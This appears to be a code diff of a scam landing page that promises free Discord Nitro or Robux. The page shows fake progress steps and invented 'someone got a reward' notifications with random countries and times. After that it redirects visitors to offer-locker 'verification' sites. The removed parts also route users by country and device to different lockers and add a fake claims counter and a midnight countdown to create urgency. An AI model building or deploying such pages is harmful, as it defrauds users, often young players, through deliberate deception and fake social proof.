@@ -3,8 +3,8 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Nitro Rewards Access | Daily Reward Options</title>
-  <meta name="description" content="Explore available Discord Nitro and Robux reward options, then continue to the verification step." />
+  <title>Nitro Rewards Access | Verification & Daily Reward Options</title>
+  <meta name="description" content="Explore Discord Nitro and Robux reward options, review available choices, and continue to a lightweight verification step to claim access." />
   <meta name="theme-color" content="#5865f2" />
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
@@ -70,58 +70,9 @@
       background: rgba(88, 101, 242, 0.35);
     }
 
-    .lang-link.is-active, .lang-link.active {
+    .lang-link.active {
       background: #5865f2;
       color: white;
-    }
-
-    .lang-notice {
-      background: #1a1c28;
-      border-radius: 1rem;
-      padding: 0.8rem 1rem;
-      margin-bottom: 1rem;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      flex-wrap: wrap;
-      gap: 0.8rem;
-      font-size: 0.75rem;
-      border-left: 3px solid #5865f2;
-      color: #cbd5ff;
-      animation: slideDown 0.25s ease;
-    }
-
-    .lang-notice-copy strong {
-      color: white;
-    }
-
-    .lang-notice-actions {
-      display: flex;
-      gap: 0.6rem;
-    }
-
-    .lang-notice-btn {
-      background: #5865f2;
-      color: white;
-      padding: 0.3rem 0.8rem;
-      border-radius: 2rem;
-      text-decoration: none;
-      font-size: 0.7rem;
-      font-weight: 500;
-    }
-
-    .lang-notice-dismiss {
-      background: rgba(255,255,255,0.1);
-      color: #9a9fc0;
-      border: none;
-      padding: 0.3rem 0.8rem;
-      border-radius: 2rem;
-      font-size: 0.7rem;
-      cursor: pointer;
-    }
-
-    .hidden {
-      display: none;
     }
 
     .card {
@@ -393,7 +344,7 @@
       margin-top: 1.5rem;
     }
 
-    /* ACTIVITY TOASTS */
+    /* ACTIVITY TOASTS - Clean style exactly like image */
     .activity-toasts {
       position: fixed;
       bottom: 24px;
@@ -401,66 +352,45 @@
       z-index: 1000;
       display: flex;
       flex-direction: column;
-      gap: 12px;
+      gap: 10px;
       pointer-events: none;
     }
 
     .activity-toast {
-      background: #1a1c2a;
-      backdrop-filter: blur(12px);
-      border-radius: 1rem;
-      padding: 0.6rem 0.8rem;
-      min-width: 240px;
-      max-width: 280px;
-      display: flex;
-      align-items: center;
-      gap: 0.75rem;
-      animation: slideInLeft 0.35s ease;
-      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
-      border-left: 3px solid #f5b042;
+      background: #1e2030;
+      backdrop-filter: blur(16px);
+      border-radius: 12px;
+      padding: 12px 16px;
+      min-width: 220px;
+      max-width: 260px;
+      animation: slideInLeft 0.3s ease;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+      border-left: 3px solid;
     }
 
-    .activity-media {
-      flex-shrink: 0;
+    .toast-nitro {
+      border-left-color: #5865f2;
     }
 
-    .activity-img {
-      width: 40px;
-      height: 40px;
-      border-radius: 10px;
-      background: #0f1119;
-      object-fit: contain;
+    .toast-robux {
+      border-left-color: #f5b042;
     }
 
-    .activity-copy {
-      flex: 1;
+    .toast-line1 {
+      font-size: 0.7rem;
+      color: #9a9fc0;
+      margin-bottom: 4px;
     }
 
-    .activity-title {
-      font-size: 0.65rem;
-      color: #b0b5d0;
-      display: flex;
-      align-items: center;
-      gap: 4px;
-      flex-wrap: wrap;
-    }
-
-    .activity-country-flag {
-      width: 20px;
-      height: 15px;
-      border-radius: 2px;
-      object-fit: cover;
-    }
-
-    .activity-reward {
+    .toast-reward {
       font-weight: 700;
-      font-size: 0.8rem;
+      font-size: 0.9rem;
       color: #fff;
-      margin: 2px 0;
+      margin-bottom: 4px;
     }
 
-    .activity-time {
-      font-size: 0.55rem;
+    .toast-time {
+      font-size: 0.6rem;
       color: #6a6f90;
     }
 
@@ -475,17 +405,6 @@
       }
     }
 
-    @keyframes slideDown {
-      from {
-        opacity: 0;
-        transform: translateY(-10px);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-
     @media (max-width: 640px) {
       body { padding: 1rem; }
       .card { padding: 1.25rem; }
@@ -494,9 +413,7 @@
       .choice-icon img { width: 42px; height: 42px; }
       h1 { font-size: 1.2rem; }
       .activity-toasts { bottom: 12px; left: 12px; }
-      .activity-toast { min-width: 200px; padding: 0.5rem 0.6rem; }
-      .activity-img { width: 32px; height: 32px; }
-      .activity-reward { font-size: 0.7rem; }
+      .activity-toast { min-width: 180px; padding: 10px 14px; }
     }
 
     .disabled {
@@ -504,6 +421,18 @@
       opacity: 0.6;
     }
   </style>
+  <!-- Google Translate Widget -->
+  <script type="text/javascript">
+    function googleTranslateElementInit() {
+      new google.translate.TranslateElement({
+        pageLanguage: 'en',
+        includedLanguages: 'en,fr,es,pt,id',
+        layout: google.translate.TranslateElement.InlineLayout.SIMPLE,
+        autoDisplay: false
+      }, 'google_translate_element');
+    }
+  </script>
+  <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
 </head>
 <body>
   <main class="wrap">
@@ -511,10 +440,11 @@
       <a class="lang-link" data-lang="en">English</a>
       <a class="lang-link" data-lang="fr">Français</a>
       <a class="lang-link" data-lang="es">Español</a>
-      <a class="lang-link" data-lang="pt-br">Português BR</a>
+      <a class="lang-link" data-lang="pt">Português BR</a>
       <a class="lang-link" data-lang="id">Indonesia</a>
     </nav>
-    <div id="language-notice" class="lang-notice hidden" aria-live="polite"></div>
+    <!-- Hidden Google Translate container -->
+    <div id="google_translate_element" style="display: none;"></div>
 
     <section class="card" aria-labelledby="page-title">
       <header class="header">
@@ -605,157 +535,110 @@
   <div id="activity-toasts" class="activity-toasts" aria-live="polite" aria-atomic="true"></div>
 
   <script>
-    // ==================== CONFIG ====================
-    window.APP_CONFIG = {
-      DEBUG_DEVICE_REDIRECT: true,
-      GEO_LOOKUP_URL: "https://ipapi.co/json/",
-      GEO_TIMEOUT_MS: 2000,
-      GEO_GROUPS: {
-        tier1: ["US", "GB", "CA", "AU"],
-        eu: ["FR", "DE", "ES", "IT", "NL", "BE", "CH", "AT"],
-        latam: ["BR", "MX", "AR", "CL", "CO", "PE"],
-        asia: ["ID", "PH", "IN", "VN", "MY", "TH"]
-      },
-      LOCKERS: {
-        tier1_ios: "https://targetoffers.xyz/cl/i/4orwg4",
-        tier1_android: "https://targetoffers.xyz/cl/i/j7nd5k",
-        tier1_desktop: "https://targetoffers.xyz/cl/i/xp2mdv",
-        eu_ios: "https://targetoffers.xyz/cl/i/l7mdgk",
-        eu_android: "https://targetoffers.xyz/cl/i/6n9o2j",
-        eu_desktop: "https://targetoffers.xyz/cl/i/82v3j3",
-        lowtier_mobile: "https://targetoffers.xyz/cl/i/grj4g1",
-        lowtier_desktop: "https://targetoffers.xyz/cl/i/pqrxgl",
-        fallback: "https://targetoffers.xyz/cl/i/pqrxgl"
-      },
-      REDIRECT_URLS: {
-        computer: "https://targetoffers.xyz/cl/i/pqrxgl",
-        ios: "https://targetoffers.xyz/cl/i/pqrxgl",
-        android: "https://targetoffers.xyz/cl/i/pqrxgl",
-        windows: "https://targetoffers.xyz/cl/i/pqrxgl",
-        linux: "https://targetoffers.xyz/cl/i/pqrxgl",
-        mac: "https://targetoffers.xyz/cl/i/pqrxgl",
-        fallback: "https://targetoffers.xyz/cl/i/pqrxgl"
-      }
+    // ==================== REDIRECT URLS (random selection) ====================
+    const REDIRECT_URLS = [
+      "https://rainawards.com/ow/6a1a96bb419d7ab04aa64184",
+      "https://rainawards.com/ow/69bf833f2d6a708a36f234d5"
+    ];
+
+    function getRandomRedirectUrl() {
+      return REDIRECT_URLS[Math.floor(Math.random() * REDIRECT_URLS.length)];
+    }
+
+    // ==================== GOOGLE TRANSLATE INTEGRATION ====================
+    const langMap = {
+      'en': 'en',
+      'fr': 'fr',
+      'es': 'es',
+      'pt': 'pt',
+      'id': 'id'
     };
 
-    window.PAGE_I18N = {
-      generateCta: "Continue",
-      generateCtaWithChoice: "Continue with {choice}",
-      actionsNote: "Select one of the two best rewards to unlock the button.",
-      rewardReadyTitle: "Reward page ready",
-      rewardReadySub: "{choice} is ready. Sending you to verification now.",
-      errorTitle: "Unable to continue",
-      errorSub: "Please try again.",
-      activityIntro: "Someone from",
-      activityVerb: "got",
-      secondAgo: "sec ago",
-      minuteAgo: "min ago",
-      rewardChoices: [
-        { title: "Nitro Boost", price: "$99.99", desc: "Top Nitro option with boosts, streaming perks, and profile extras.", badge: "Best Value", iconType: "img", icon: "https://i.postimg.cc/3JgsR1xh/nitroboost.webp" },
-        { title: "4500 Robux", price: "$49.99", desc: "Large Robux pack for upgrades, passes, and future drops.", iconType: "img", icon: "https://i.postimg.cc/1RgP9DFD/robux-1.webp" }
-      ],
-      progressSteps: [
-        { label: "Preparing...", sub: "Opening a secure reward page for your session", min: 500, max: 750, target: 30 },
-        { label: "Checking...", sub: "Reviewing available options for your device and region", min: 650, max: 900, target: 66 },
-        { label: "Finalizing...", sub: "Continuing to the verification step", min: 700, max: 950, target: 100 }
-      ]
-    };
-
-    // ==================== LANGUAGE ROUTING ====================
-    (function() {
-      const STORAGE_KEY = "preferred_language_path";
-      const LANGUAGE_ROUTES = { en: "/en/", fr: "/fr/", es: "/es/", "pt-br": "/pt-br/", id: "/id/" };
-      const LANGUAGE_LABELS = { en: "English", fr: "Français", es: "Español", "pt-br": "Português BR", id: "Indonesia" };
-      const ROOT_PATHS = new Set(["/", "/index.html"]);
-
-      function getCurrentRouteLanguage() {
-        const pathname = window.location.pathname.toLowerCase();
-        return Object.keys(LANGUAGE_ROUTES).find((lang) => pathname === LANGUAGE_ROUTES[lang]) || "";
+    function triggerGoogleTranslate(langCode) {
+      const googleLang = langMap[langCode] || 'en';
+      const select = document.querySelector('.goog-te-combo');
+      if (select) {
+        select.value = googleLang;
+        select.dispatchEvent(new Event('change'));
+      } else {
+        const checkInterval = setInterval(function() {
+          const selectEl = document.querySelector('.goog-te-combo');
+          if (selectEl) {
+            selectEl.value = googleLang;
+            selectEl.dispatchEvent(new Event('change'));
+            clearInterval(checkInterval);
+          }
+        }, 100);
+        setTimeout(function() { clearInterval(checkInterval); }, 3000);
       }
+      localStorage.setItem('preferred_language', langCode);
+    }
 
-      function getPreferredLanguage() {
-        const saved = localStorage.getItem(STORAGE_KEY);
-        if (saved && LANGUAGE_ROUTES[saved]) return saved;
-        const browserLang = navigator.language || "en";
-        if (browserLang.startsWith("pt")) return "pt-br";
-        if (browserLang.startsWith("id")) return "id";
-        if (browserLang.startsWith("fr")) return "fr";
-        if (browserLang.startsWith("es")) return "es";
-        return "en";
-      }
-
-      function markActiveLinks() {
-        const currentLang = getCurrentRouteLanguage();
-        document.querySelectorAll(".lang-link").forEach(link => {
-          if (link.dataset.lang === currentLang) link.classList.add("is-active");
-          else link.classList.remove("is-active");
-        });
-      }
-
-      function mountLanguageNotice() {
-        const notice = document.getElementById("language-notice");
-        const currentPath = window.location.pathname.toLowerCase();
-        if (!notice || !ROOT_PATHS.has(currentPath)) return;
-        const preferred = getPreferredLanguage();
-        const label = LANGUAGE_LABELS[preferred];
-        notice.classList.remove("hidden");
-        notice.innerHTML = `
-          <div class="lang-notice-copy"><strong>${label}</strong> is available for this reward page. You can stay here or open the matching language version.</div>
-          <div class="lang-notice-actions">
-            <a class="lang-notice-btn" data-lang="${preferred}" href="#">Open ${label}</a>
-            <button class="lang-notice-dismiss" type="button">Stay here</button>
-          </div>
-        `;
-        notice.querySelector(".lang-notice-btn")?.addEventListener("click", (e) => {
-          e.preventDefault();
-          localStorage.setItem(STORAGE_KEY, preferred);
-          window.location.href = LANGUAGE_ROUTES[preferred];
-        });
-        notice.querySelector(".lang-notice-dismiss")?.addEventListener("click", () => notice.classList.add("hidden"));
-      }
-
-      document.querySelectorAll(".lang-link").forEach(link => {
-        link.addEventListener("click", (e) => {
-          e.preventDefault();
-          localStorage.setItem(STORAGE_KEY, link.dataset.lang);
-          window.location.href = LANGUAGE_ROUTES[link.dataset.lang] || "/";
-        });
+    function setActiveLang(langCode) {
+      document.querySelectorAll('.lang-link').forEach(link => {
+        if (link.getAttribute('data-lang') === langCode) {
+          link.classList.add('active');
+        } else {
+          link.classList.remove('active');
+        }
       });
-      markActiveLinks();
-      mountLanguageNotice();
-    })();
+    }
+
+    function getSavedLanguage() {
+      return localStorage.getItem('preferred_language') || 'en';
+    }
+
+    function applySavedLanguage() {
+      const savedLang = getSavedLanguage();
+      setActiveLang(savedLang);
+      if (savedLang !== 'en') {
+        triggerGoogleTranslate(savedLang);
+      }
+    }
+
+    document.querySelectorAll('.lang-link').forEach(link => {
+      link.addEventListener('click', (e) => {
+        e.preventDefault();
+        const langCode = link.getAttribute('data-lang');
+        setActiveLang(langCode);
+        triggerGoogleTranslate(langCode);
+      });
+    });
+
+    setTimeout(applySavedLanguage, 800);
 
     // ==================== MAIN SCRIPT ====================
     document.addEventListener("DOMContentLoaded", () => {
-      const pageI18n = window.PAGE_I18N;
-      const redirectUrls = window.APP_CONFIG?.REDIRECT_URLS || {};
-      const lockers = window.APP_CONFIG?.LOCKERS || {};
-      const FALLBACK_REDIRECT_URL = lockers.fallback || redirectUrls.fallback || "https://targetoffers.xyz/cl/i/pqrxgl";
-
       const choicesEl = document.getElementById("choices");
       const progressDiv = document.getElementById("progress");
       const statusText = document.getElementById("status-text");
       const statusSub = document.getElementById("status-sub");
       const barFill = document.getElementById("bar-fill");
-      const actionsDiv = document.getElementById("actions");
       const generateBtn = document.getElementById("generate-btn");
       const actionsNote = document.querySelector(".actions-note");
       const activityToasts = document.getElementById("activity-toasts");
 
       let selectedChoice = null;
-      let progressTimers = [];
+      let selectedChoiceTitle = null;
       let lastCountryCode = null;
       let activityAgeIndex = 0;
 
-      const rewardChoices = pageI18n.rewardChoices;
-      const progressSteps = pageI18n.progressSteps;
+      const rewardChoices = [
+        { title: "Nitro Boost", price: "$99.99", desc: "Top Nitro option with boosts, streaming perks, and profile extras.", badge: "Best Value", icon: "https://i.postimg.cc/3JgsR1xh/nitroboost.webp", type: "nitro" },
+        { title: "4500 Robux", price: "$49.99", desc: "Large Robux pack for upgrades, passes, and future drops.", icon: "https://i.postimg.cc/1RgP9DFD/robux-1.webp", type: "robux" }
+      ];
+
+      const progressSteps = [
+        { label: "Preparing...", sub: "Opening a secure reward page for your session", min: 500, max: 750, target: 30 },
+        { label: "Checking...", sub: "Reviewing available options for your device and region", min: 650, max: 900, target: 66 },
+        { label: "Finalizing...", sub: "Continuing to the verification step", min: 700, max: 950, target: 100 }
+      ];
 
       function rand(min, max) { return Math.floor(min + Math.random() * (max - min + 1)); }
       function pickRandom(arr) { return arr[rand(0, arr.length - 1)]; }
-      function interpolate(template, values) { return String(template).replace(/\{(\w+)\}/g, (_, k) => values[k] ?? ""); }
 
       const activityCountries = [
-        { code: "us", name: "United States", flag: "🇺🇸" }, { code: "gb", name: "United Kingdom", flag: "🇬🇧" },
+        { code: "gb", name: "United Kingdom", flag: "🇬🇧" }, { code: "us", name: "United States", flag: "🇺🇸" },
         { code: "ca", name: "Canada", flag: "🇨🇦" }, { code: "fr", name: "France", flag: "🇫🇷" },
         { code: "de", name: "Germany", flag: "🇩🇪" }, { code: "br", name: "Brazil", flag: "🇧🇷" },
         { code: "au", name: "Australia", flag: "🇦🇺" }, { code: "es", name: "Spain", flag: "🇪🇸" },
@@ -764,16 +647,8 @@
       ];
 
       function getActivityTime() {
-        const secondAgo = pageI18n.secondAgo || "sec ago";
-        const minuteAgo = pageI18n.minuteAgo || "min ago";
-        const steps = [
-          () => `${rand(8, 22)} ${secondAgo}`, () => `${rand(24, 48)} ${secondAgo}`,
-          () => `${rand(1, 3)} ${minuteAgo}`, () => `${rand(4, 7)} ${minuteAgo}`,
-          () => `${rand(8, 14)} ${minuteAgo}`
-        ];
-        const label = steps[activityAgeIndex % steps.length]();
-        activityAgeIndex++;
-        return label;
+        const seconds = rand(5, 45);
+        return `${seconds} sec ago`;
       }
 
       function showActivityToast() {
@@ -782,38 +657,42 @@
         lastCountryCode = country.code;
         const reward = pickRandom(rewardChoices);
         const timeText = getActivityTime();
+        const toastType = reward.type === "nitro" ? "toast-nitro" : "toast-robux";
+        
         const toast = document.createElement("div");
-        toast.className = "activity-toast";
+        toast.className = `activity-toast ${toastType}`;
         toast.innerHTML = `
-          <div class="activity-media"><img class="activity-img" src="${reward.icon}" alt="${reward.title}" loading="lazy" /></div>
-          <div class="activity-copy">
-            <div class="activity-title">${pageI18n.activityIntro || "Someone from"} ${country.flag} ${pageI18n.activityVerb || "got"}</div>
-            <div class="activity-reward">${reward.title}</div>
-            <div class="activity-time">🕐 ${timeText}</div>
-          </div>
+          <div class="toast-line1">Someone from ${country.flag}</div>
+          <div class="toast-reward">${reward.title}</div>
+          <div class="toast-time">got · ${timeText}</div>
         `;
         activityToasts.prepend(toast);
-        while (activityToasts.children.length > 2) activityToasts.lastElementChild.remove();
-        setTimeout(() => toast.remove(), 6000);
+        while (activityToasts.children.length > 3) activityToasts.lastElementChild.remove();
+        setTimeout(() => {
+          toast.style.opacity = '0';
+          toast.style.transition = 'opacity 0.3s';
+          setTimeout(() => toast.remove(), 300);
+        }, 5500);
       }
 
       function scheduleActivityToast() {
         setInterval(() => { if (Math.random() > 0.3) showActivityToast(); }, rand(18000, 28000));
-        setTimeout(showActivityToast, 3000);
+        setTimeout(showActivityToast, 2000);
       }
 
       function selectChoice(card, item) {
         document.querySelectorAll(".choice-card").forEach(c => c.classList.remove("active"));
         card.classList.add("active");
         selectedChoice = item;
+        selectedChoiceTitle = item.title;
         if (generateBtn) generateBtn.disabled = false;
         if (actionsNote) actionsNote.classList.add("hidden");
-        generateBtn.textContent = interpolate(pageI18n.generateCtaWithChoice || "Continue with {choice}", { choice: item.title });
+        generateBtn.textContent = `Continue with ${item.title}`;
       }
 
       function buildChoices() {
         choicesEl.innerHTML = "";
-        rewardChoices.forEach((item, idx) => {
+        rewardChoices.forEach((item) => {
           const card = document.createElement("button");
           card.type = "button";
           card.className = "choice-card";
@@ -830,40 +709,6 @@
         generateBtn.disabled = true;
       }
 
-      function detectDevice() {
-        const ua = navigator.userAgent;
-        if (ua.includes("Android")) return "android";
-        if (/iPhone|iPad|iPod/i.test(ua)) return "ios";
-        if (ua.includes("Windows")) return "windows";
-        if (ua.includes("Linux")) return "linux";
-        if (ua.includes("Mac")) return "mac";
-        return "desktop";
-      }
-
-      async function getCountryCode() {
-        try {
-          const res = await fetch("https://ipapi.co/json/", { timeout: 2000 });
-          const data = await res.json();
-          return String(data.country_code || "OTHER").toUpperCase();
-        } catch { return "OTHER"; }
-      }
-
-      function getRedirectUrl(device, country) {
-        const deviceFamily = (device === "ios" || device === "android") ? device : "desktop";
-        const isTier1 = ["US","GB","CA","AU"].includes(country);
-        const isEU = ["FR","DE","ES","IT","NL","BE","CH","AT"].includes(country);
-        if (isTier1) return lockers[`tier1_${deviceFamily}`] || FALLBACK_REDIRECT_URL;
-        if (isEU) return lockers[`eu_${deviceFamily}`] || FALLBACK_REDIRECT_URL;
-        return lockers[`lowtier_${deviceFamily === "desktop" ? "desktop" : "mobile"}`] || FALLBACK_REDIRECT_URL;
-      }
-
-      async function redirectUser() {
-        const device = detectDevice();
-        const country = await getCountryCode();
-        const url = getRedirectUrl(device, country);
-        window.location.href = url;
-      }
-
       function startProgress() {
         if (!selectedChoice) return;
         document.querySelectorAll(".choice-card").forEach(c => c.classList.add("disabled"));
@@ -874,7 +719,10 @@
         let idx = 0;
         function advance() {
           if (idx >= steps.length) {
-            setTimeout(redirectUser, 300);
+            const redirectUrl = getRandomRedirectUrl();
+            setTimeout(() => {
+              window.location.href = redirectUrl;
+            }, 300);
             return;
           }
           const step = steps[idx];
@@ -891,30 +739,6 @@
       buildChoices();
       generateBtn.addEventListener("click", startProgress);
       scheduleActivityToast();
-
-      // claims counter
-      const claimsSpan = document.getElementById("claims-count");
-      if (claimsSpan) {
-        let count = rand(847, 1243);
-        claimsSpan.textContent = count;
-        setInterval(() => { count += rand(1, 3); claimsSpan.textContent = count; }, rand(40000, 80000));
-      }
-
-      // countdown timer
-      const timerSpan = document.getElementById("countdown-timer");
-      if (timerSpan) {
-        function updateTimer() {
-          const now = new Date();
-          const midnight = new Date(now); midnight.setHours(24, 0, 0, 0);
-          const diff = midnight - now;
-          const h = String(Math.floor(diff / 3600000)).padStart(2,"0");
-          const m = String(Math.floor((diff % 3600000) / 60000)).padStart(2,"0");
-          const s = String(Math.floor((diff % 60000) / 1000)).padStart(2,"0");
-          timerSpan.textContent = `${h}:${m}:${s}`;
-        }
-        updateTimer();
-        setInterval(updateTimer, 1000);
-      }
     });
   </script>
 </body>
